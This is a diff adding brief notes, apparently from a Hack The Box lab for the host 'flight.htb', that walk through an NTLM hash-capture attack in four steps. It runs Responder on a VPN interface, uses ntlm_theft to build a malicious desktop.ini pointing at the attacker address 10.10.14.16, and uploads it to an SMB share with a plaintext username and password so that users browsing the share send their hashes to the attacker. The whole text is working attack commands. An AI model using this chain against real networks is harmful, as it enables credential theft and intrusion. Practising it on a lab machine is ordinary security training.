@@ -1,0 +1,7 @@
+1) sudo responder -I tun0 -w -F
+
+2) python3 ntlm_theft.py --generate desktopini --server 10.10.14.16 --filename tabiefendim == replace --server "ip" with your ip
+
+3) smbmap -H flight.htb -u S.MOON -p 'S@Ss!K@*t13' --upload desktop.ini Shared\\desktop.ini\\ == desktop.ini spawns at under tabiefendim/desktop.ini
+
+4) This payloads does, forcing to request random users to your server so you can grap hashes with responder
